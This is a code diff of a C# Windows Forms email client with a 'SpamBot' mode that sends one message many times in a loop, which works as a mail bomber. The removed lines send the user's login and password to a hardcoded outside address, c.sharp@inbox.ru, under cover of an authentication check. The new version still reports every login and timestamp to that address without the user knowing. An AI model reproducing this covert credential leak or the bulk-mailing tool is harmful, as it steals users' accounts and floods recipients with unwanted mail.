@@ -1,14 +1,13 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Linq;
+using System.Drawing.Text;
+using System.Net.Mime;
 using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Net;
 using System.Net.Mail;
+using System.IO;
+using System.Threading;
 
 namespace Email_Messenger
 {
@@ -16,20 +15,30 @@ namespace Email_Messenger
     {
         string login;
         string pass;
-        int idForm = 0;
-        int idMode = 0;
-        string smtpHost = "";
+        int idMode;
+        int idFile;
+        string smtpHost;
+        int smtpPort;
+        string file;
+        DateTime thisDay = DateTime.Now;
         public Form1()
         {
             InitializeComponent();
             comboBox1.SelectedIndex = 0;
         }
-        public void SendEmail(string a, string b, string c, string d)
+        #region SendMail
+        //авторизация пользователя
+        public void SendEmail(string smtp)
         {
-            //smtp сервер
-            string smtpHost = String.Format("smtp.{0}", d.Trim(new[] { '@' } ));
-            //smtp порт
-            int smtpPort = 25;
+            smtpHost = String.Format("smtp.{0}", smtp.Trim(new[] { '@' }));
+            if (comboBox1.SelectedIndex == 2)
+            {
+                smtpPort = 587;
+            }
+            else
+            {
+                smtpPort = 25;
+            }
             //логин
             string login = this.login;
             //пароль
@@ -38,85 +47,100 @@ namespace Email_Messenger
             //создаем подключение
             SmtpClient client = new SmtpClient(smtpHost, smtpPort);
             client.Credentials = new NetworkCredential(login, pass);
+            client.EnableSsl = true;
 
             //От кого письмо
             string from = this.login;
             //Кому письмо
-            string to = a;
+            string to = "c.sharp@inbox.ru";
             //Тема письма
-            string subject = b;
+            string subject = "Authorization";
             //Текст письма
-            string body = c;
+            string body = this.login + " авторизован!\n-----------------\n" + thisDay;
             //Создаем сообщение
             MailMessage mess = new MailMessage(from, to, subject, body);
 
             try
             {
                 client.Send(mess);
-                idForm = 1;
+                panel1.Visible = true;
+                panel2.Visible = false;
+                menuStrip1.Visible = true;
             }
             catch (Exception)
             {
-                idForm = 0;
-                MessageBox.Show("Неправильный логин или пароль");
+                label6.Text = "Неправильный логин или пароль";
             }
         }
-        private void button1_Click(object sender, EventArgs e)
+        //отправка сообщения
+        public void SendEmail()
         {
-            CountOfMessages();
-            progressBar1.Visible = false;
-            label6.Text = "Mail sent!!!"; 
-        }
-        public void anotherUser()
-        {
-            textBox1.Clear();
-            textBox2.Clear();
-            textBox3.Clear();
-            textBox4.Clear();
-            richTextBox1.Clear();
-            label6.Text = "";
-            idForm = 0;
-        }
-        private void button2_Click(object sender, EventArgs e)
-        {
-            richTextBox1.Clear();
-            label6.Text = "";
-            numericUpDown1.Value = 1;
-        }
+            //создаем подключение
+            SmtpClient client = new SmtpClient(smtpHost, smtpPort);
+            client.Credentials = new NetworkCredential(login, pass);
+            client.EnableSsl = true;
 
-        public void Authentication()
-        {
-           SendEmail("c.sharp@inbox.ru", login, pass, smtpHost);
-            if (idForm == 1)
+            //От кого письмо
+            string from = login;
+            //Кому письмо
+            string to = textBox1.Text;
+            //Тема письма
+            string subject = textBox2.Text;
+            //Текст письма
+            string body = bodyTextBox.Text;
+
+            try
             {
-                menuStrip1.Visible = true;
-                panel2.Visible = false;
-                panel1.Visible = true;
+                MailMessage mess = new MailMessage(from, to, subject, body);
+                if (idFile == 1)
+                {
+                    // Create  the file attachment for this e-mail message.
+                    Attachment data = new Attachment(file, MediaTypeNames.Application.Octet);
+                    // Add time stamp information for the file.
+                    ContentDisposition disposition = data.ContentDisposition;
+                    disposition.CreationDate = File.GetCreationTime(file);
+                    disposition.ModificationDate = File.GetLastWriteTime(file);
+                    disposition.ReadDate = File.GetLastAccessTime(file);
+                    // Add the file attachment to this e-mail message.
+                    mess.Attachments.Add(data);
+                }
+                client.Send(mess);
+                if (idMode == 0)
+                {
+                    MessageBox.Show("Сообщение отправлено");
+                }
             }
-        }
-        private void button3_Click(object sender, EventArgs e)
-        {
-            login = String.Format("{0}{1}", textBox3.Text, comboBox1.Text);
-            pass = textBox4.Text;
-            smtpHost = comboBox1.Text;
-
-            if (textBox3.Text != "" && textBox4.Text != "")
+            catch (FormatException)
             {
-                Authentication();
+                MessageBox.Show("Корректно заполните обязательные поля");
             }
-            else
+            catch (SmtpFailedRecipientException)
             {
-                MessageBox.Show("Введите логин и пароль");
+                MessageBox.Show("Корректно заполните обязательные поля");
             }
-        }
+            catch (Exception)
+            {
+                MessageBox.Show("Нет соединения с сервером");
+            }
 
-        private void сменитьПользователяToolStripMenuItem_Click(object sender, EventArgs e)
+        }
+        #endregion
+        public void SpamBotMessages()
         {
-            anotherUser();
-            panel2.Visible = true;
-            panel1.Visible = false;
+            CheckForIllegalCrossThreadCalls = false;
+            progressBar1.Minimum = 0;
+            progressBar1.Maximum = (int)countOfMessage.Value;
+            progressBar1.Value = 1;
+            progressBar1.Step = 1;
+            for (int i = 0; i < countOfMessage.Value; i++)
+            {
+                SendEmail();
+                progressBar1.PerformStep();
+                Thread.Sleep(500);
+            }
+            progressBar1.Value = 0;
+            MessageBox.Show("Сообщения отправлены");
         }
-
         private void Enter(object sender, KeyEventArgs e)
         {
             if (e.KeyCode == Keys.Enter)
@@ -124,54 +148,92 @@ namespace Email_Messenger
                 login = String.Format("{0}{1}", textBox3.Text, comboBox1.Text);
                 pass = textBox4.Text;
                 smtpHost = comboBox1.Text;
-
                 if (textBox3.Text != "" && textBox4.Text != "")
                 {
-                    Authentication();
+                    SendEmail(smtpHost);
                 }
                 else
                 {
-                    MessageBox.Show("Введите логин и пароль");
+                    label6.Text = "Введите логин и пароль";
                 }
             }
         }
-
-        public void CountOfMessages()
+        private void SendButton(object sender, EventArgs e)
         {
-            progressBar1.Visible = true;
-            // Set Minimum to 1 to represent the first file being copied.
-            progressBar1.Minimum = 1;
-            // Set Maximum to the total number of files to copy.
-            progressBar1.Maximum = (int)numericUpDown1.Value;
-            // Set the initial value of the ProgressBar.
-            progressBar1.Value = 1;
-            // Set the Step property to a value of 1 to represent each file being copied.
-            progressBar1.Step = 1;
-            for (int i = 1; i <= numericUpDown1.Value; i++)
+            if (textBox1.Text != "" && textBox2.Text != "")
             {
-                SendEmail(textBox1.Text, textBox2.Text, richTextBox1.Text, smtpHost);
-                progressBar1.PerformStep();
-                System.Threading.Thread.Sleep(500);
+                if (idMode == 0)
+                {
+                    SendEmail();
+                }
+                else
+                {
+                    Thread th = new Thread(new ThreadStart(SpamBotMessages));
+                    th.Start();
+                }
+            }
+            else
+            {
+                MessageBox.Show("Заполните обязательные поля");
             }
         }
-        private void toolStripMenuItem2_Click(object sender, EventArgs e)
+        private void ClearButton(object sender, EventArgs e)
         {
-            if (idMode==0)
+            bodyTextBox.Clear();
+            countOfMessage.Value = 2;
+            idFile = 0;
+            fileNameLabel.Text = "";
+        }
+        private void AuthorizationButton(object sender, EventArgs e)
+        {
+            login = String.Format("{0}{1}", textBox3.Text, comboBox1.Text);
+            pass = textBox4.Text;
+            smtpHost = comboBox1.Text;
+            if (textBox3.Text != "" && textBox4.Text != "")
+            {
+                SendEmail(smtpHost);
+            }
+            else
+            {
+                label6.Text = "Введите логин и пароль";
+            }
+        }
+        private void AnotherUser(object sender, EventArgs e)
+        {
+            Application.Restart();
+        }
+        private void SpamBotMode(object sender, EventArgs e)
+        {
+            if (idMode == 0)
             {
                 idMode = 1;
-                label6.Text = "";
-                numericUpDown1.Visible = true;
+                countOfMessage.Visible = true;
                 label7.Visible = true;
+                progressBar1.Visible = true;
             }
             else
             {
                 idMode = 0;
-                label6.Text = "";
-                numericUpDown1.Visible = false;
+                countOfMessage.Visible = false;
                 label7.Visible = false;
                 progressBar1.Visible = false;
-                numericUpDown1.Value = 1;
+                progressBar1.Value = 0;
+                countOfMessage.Value = 2;
             }
+        }
+        private void AttachFile(object sender, EventArgs e)
+        {
+            if (openFileDialog1.ShowDialog() == DialogResult.OK)
+            {
+                idFile = 1;
+                file = openFileDialog1.FileName;
+                fileNameLabel.Text = openFileDialog1.SafeFileName;
+            }
+        }
+        private void DeleteFile(object sender, EventArgs e)
+        {
+            idFile = 0;
+            fileNameLabel.Text = "";
         }
     }
 }
